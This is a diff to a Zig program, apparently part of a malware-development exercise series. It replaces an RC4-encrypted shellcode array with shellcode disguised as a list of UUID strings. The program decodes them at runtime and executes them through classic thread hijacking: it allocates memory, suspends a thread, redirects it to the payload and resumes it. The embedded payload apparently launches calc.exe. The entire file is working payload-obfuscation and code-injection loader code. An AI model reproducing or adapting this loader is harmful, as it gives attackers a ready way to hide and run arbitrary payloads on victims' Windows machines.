@@ -1,6 +1,6 @@
 const std = @import("std");
 const win = @import("zigwin32").everything;
-const RC4 = @import("5.payload-encryption-rc4.zig").RC4;
+const uuidDeobfuscation = @import("12.payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;
 
 const HANDLE = win.HANDLE;
 const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
@@ -25,7 +25,26 @@ const ResumeThread = win.ResumeThread;
 const WaitForSingleObject = win.WaitForSingleObject;
 const CloseHandle = win.CloseHandle;
 
-var shellcode = [_]u8{ 23, 141, 219, 17, 48, 196, 44, 252, 64, 174, 48, 190, 29, 155, 98, 30, 195, 233, 17, 243, 40, 11, 238, 187, 108, 245, 244, 137, 73, 52, 37, 197, 9, 237, 85, 80, 245, 61, 175, 26, 140, 251, 1, 219, 237, 249, 52, 48, 70, 16, 121, 146, 164, 218, 220, 11, 212, 208, 32, 169, 57, 149, 211, 127, 159, 141, 69, 183, 27, 158, 43, 0, 152, 168, 170, 194, 9, 11, 63, 63, 251, 112, 129, 200, 205, 213, 153, 63, 133, 163, 196, 80, 115, 42, 90, 152, 105, 161, 253, 239, 51, 195, 11, 43, 238, 56, 246, 249, 73, 132, 94, 250, 127, 238, 0, 79, 39, 236, 2, 146, 107, 108, 69, 92, 64, 204, 115, 125, 22, 49, 41, 70, 108, 35, 113, 150, 249, 51, 105, 115, 142, 79, 141, 109, 230, 192, 115, 133, 183, 69, 141, 34, 17, 164, 26, 82, 165, 8, 237, 111, 40, 30, 186, 170, 51, 166, 97, 188, 0, 29, 41, 97, 6, 51, 80, 80, 45, 108, 81, 143, 230, 134, 206, 252, 66, 196, 94, 108, 172, 236, 95, 212, 96, 120, 250, 196, 233, 199, 210, 210, 42, 186, 32, 157, 215, 61, 43, 206, 2, 31, 79, 170, 93, 171, 241, 104, 130, 115, 165, 57, 41, 89, 228, 179, 14, 42, 214, 16, 110, 6, 85, 199, 244, 231, 196, 150, 120, 53, 236, 129, 82, 166, 113, 192, 137, 104, 26, 15, 109, 168, 189, 184, 13, 10, 242, 243, 106, 29, 118, 229, 253, 121, 204, 49, 236, 17, 164, 106, 197, 255, 250, 148, 215, 32, 64, 93 };
+const uuid_array = [_][:0]const u8{
+    "E48348FC-E8F0-00C0-0000-415141505251",
+    "D2314856-4865-528B-6048-8B5218488B52",
+    "728B4820-4850-B70F-4A4A-4D31C94831C0",
+    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
+    "48514152-528B-8B20-423C-4801D08B8088",
+    "48000000-C085-6774-4801-D0508B481844",
+    "4920408B-D001-56E3-48FF-C9418B348848",
+    "314DD601-48C9-C031-AC41-C1C90D4101C1",
+    "F175E038-034C-244C-0845-39D175D85844",
+    "4924408B-D001-4166-8B0C-48448B401C49",
+    "8B41D001-8804-0148-D041-5841585E595A",
+    "59415841-5A41-8348-EC20-4152FFE05841",
+    "8B485A59-E912-FF57-FFFF-5D48BA010000",
+    "00000000-4800-8D8D-0101-000041BA318B",
+    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
+    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
+    "6A6F7213-5900-8941-DAFF-D563616C632E",
+    "00657865-0000-0000-0000-000000000000",
+};
 
 fn runViaClassicThreadHijacking(h_thread: HANDLE, payload: []const u8) !void {
     const address = VirtualAlloc(
@@ -79,9 +98,13 @@ fn dummyFunction() void {
 }
 
 // pub fn main() !void {
-//     var buf: [276]u8 = undefined;
-//     var rc4 = RC4.init("maldev");
-//     const decrypted_shellcode = rc4.decrypt(&buf, &shellcode);
+//     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+//     defer _ = gpa.deinit();
+//     const allocator = gpa.allocator();
+
+//     const shellcode = try uuidDeobfuscation(allocator, &uuid_array);
+//     defer allocator.free(shellcode);
+
 //     const h_thread = CreateThread(
 //         null,
 //         0,
@@ -95,16 +118,19 @@ fn dummyFunction() void {
 //     };
 //     defer _ = CloseHandle(h_thread);
 
-//     try runViaClassicThreadHijacking(h_thread, decrypted_shellcode);
+//     try runViaClassicThreadHijacking(h_thread, shellcode);
 
 //     _ = ResumeThread(h_thread);
 //     _ = WaitForSingleObject(h_thread, INFINITE);
 // }
 
 pub fn main() !void {
-    var buf: [276]u8 = undefined;
-    var rc4 = RC4.init("maldev");
-    const decrypted_shellcode = rc4.decrypt(&buf, &shellcode);
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
+    const shellcode = try uuidDeobfuscation(allocator, &uuid_array);
+    defer allocator.free(shellcode);
 
     const h_thread = CreateThread(
         null,
@@ -122,7 +148,7 @@ pub fn main() !void {
     std.time.sleep(std.time.ns_per_s * 10);
 
     _ = SuspendThread(h_thread);
-    try runViaClassicThreadHijacking(h_thread, decrypted_shellcode);
+    try runViaClassicThreadHijacking(h_thread, shellcode);
     _ = ResumeThread(h_thread);
 
     _ = WaitForSingleObject(h_thread, INFINITE);
